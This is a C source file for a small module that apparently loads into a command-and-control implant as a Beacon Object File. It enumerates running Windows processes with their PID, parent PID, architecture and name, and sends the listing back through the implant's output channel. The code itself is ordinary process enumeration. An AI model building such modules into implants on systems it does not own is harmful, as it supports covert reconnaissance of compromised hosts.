/*
 * ps.o - enumerate processes (PID/PPID/arch/name), send as text.
 */
#include <windows.h>
#include <tlhelp32.h>
#include "../bof.h"

void go(char *args, int length) {
    (void)args; (void)length;
    char *b = (char *)b_malloc(32768);
    if (!b) { b_send(POUT_ERR, "oom", 3); return; }
    int p = 0;

    HANDLE sn = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (sn == INVALID_HANDLE_VALUE) { b_send(POUT_ERR, "snap", 4); return; }

    SYSTEM_INFO si; GetSystemInfo(&si);
    BOOL is64 = (si.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_AMD64);

    p += wsprintfA(b + p, "%-8s %-6s %-5s %s\r\n", "PID", "PPID", "Arch", "Name");
    p += wsprintfA(b + p, "----------------------------------------\r\n");

    PROCESSENTRY32 pe; pe.dwSize = sizeof(pe);
    if (Process32First(sn, &pe)) {
        do {
            if (p > (int)(32768 - 512)) break;
            const char *arch = "?";
            if (is64) {
                BOOL wow = FALSE;
                HANDLE hp = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pe.th32ProcessID);
                if (hp) { IsWow64Process(hp, &wow); CloseHandle(hp); }
                arch = wow ? "x86" : "x64";
            } else arch = "x86";
            p += wsprintfA(b + p, "%-8lu %-6lu %-5s %s\r\n",
                           pe.th32ProcessID, pe.th32ParentProcessID, arch, pe.szExeFile);
        } while (Process32Next(sn, &pe));
    }
    CloseHandle(sn);
    b_send(POUT_DATA, b, p);
    b_send(POUT_DONE, "", 0);
}
